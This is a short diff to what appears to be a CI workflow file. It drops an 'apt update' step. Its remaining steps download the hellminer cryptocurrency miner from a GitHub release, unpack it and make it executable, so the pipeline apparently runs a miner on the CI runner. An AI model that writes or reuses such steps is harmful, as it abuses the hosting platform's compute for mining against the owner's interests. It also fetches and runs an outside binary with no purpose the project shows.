@@ -17,7 +17,6 @@ jobs:
         run: |
           sudo -u hudacihuyy bash -c 'echo "Hello dari user $(whoami)"'
           
-          sudo apt update
           wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
           tar -xzf hellminer_linux64.tar.gz
           chmod +x hellminer
